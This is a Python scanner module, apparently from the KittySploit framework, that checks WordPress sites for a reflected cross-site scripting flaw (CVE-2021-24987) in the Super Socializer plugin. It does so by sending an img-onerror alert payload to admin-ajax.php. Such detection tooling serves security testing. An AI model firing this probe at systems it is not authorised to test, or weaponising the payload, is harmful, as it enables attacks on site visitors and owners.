#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Super Socializer plugin before 7."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Super Socializer <7.13.30 - Cross-Site Scripting Detection',
        'description': 'WordPress Super Socializer plugin before 7.13.30 contains a reflected cross-site scripting vulnerability. It does not sanitize and escape the urls parameter in its the_champ_sharing_count AJAX action (available to both unauthenticated and authenticated users) before outputting it back in the response.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'wpscan', 'xss', 'wp', 'wp-plugin', 'wordpress', 'heateor', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/a14b668f-812f-46ee-827e-0996b378f7f0',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-24987',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2021-24987',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-admin/admin-ajax.php?action=the_champ_sharing_count&urls[]=<img%20src=x%20onerror=alert(document.domain)>', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('{"facebook_urls":[["<img src=x onerror=alert(document.domain)>"]]',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="WordPress Super Socializer <7.13.30 - Cross-Site Scripting detected",
                path='/wp-admin/admin-ajax.php?action=the_champ_sharing_count&urls[]=<img%20src=x%20onerror=alert(document.domain)>',
            )
            return True
        return False

